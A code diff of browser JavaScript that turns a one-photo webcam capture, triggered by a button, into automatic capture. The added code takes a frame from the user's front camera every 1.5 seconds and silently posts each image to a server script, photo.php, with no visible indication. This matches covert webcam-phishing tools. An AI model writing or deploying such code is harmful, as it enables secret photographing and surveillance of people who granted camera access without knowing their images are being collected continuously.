@@ -1,35 +1,46 @@
+function post(imgdata) {
+  $.ajax({
+    type: 'POST',
+    data: { cat: imgdata },
+    url: 'photo.php', 
+    dataType: 'json',
+    async: false,
+    success: function(result){
+      console.log("Foto enviada", result);
+    },
+    error: function(){
+      console.error("Error al enviar foto");
+    }
+  });
+}
+
+'use strict';
+
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const snapBtn = document.getElementById('snap');
-const photoStatus = document.getElementById('photoStatus');
+const errorMsgElement = document.querySelector('span#errorMsg');
 
-// Acceder a la cámara
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-  .then(stream => {
-    video.srcObject = stream;
-  })
-  .catch(err => {
-    photoStatus.textContent = "Error al acceder a la cámara: " + err;
-  });
+const constraints = { audio: false, video: { facingMode: "user" } };
 
-// Tomar foto
-snapBtn.addEventListener('click', () => {
-  const context = canvas.getContext('2d');
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const imgData = canvas.toDataURL("image/png");
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
 
-  photoStatus.textContent = "Enviando foto...";
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
 
-  fetch('photo.php', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: 'cat=' + encodeURIComponent(imgData)
-  })
-  .then(res => res.json())
-  .then(out => {
-    photoStatus.textContent = "Servidor respondió: " + out.status;
-  })
-  .catch(err => {
-    photoStatus.textContent = "Error: " + err;
-  });
-});
+  var context = canvas.getContext('2d');
+  setInterval(function(){
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL("image/png");
+    post(canvasData);
+  }, 1500);
+}
+
+init();
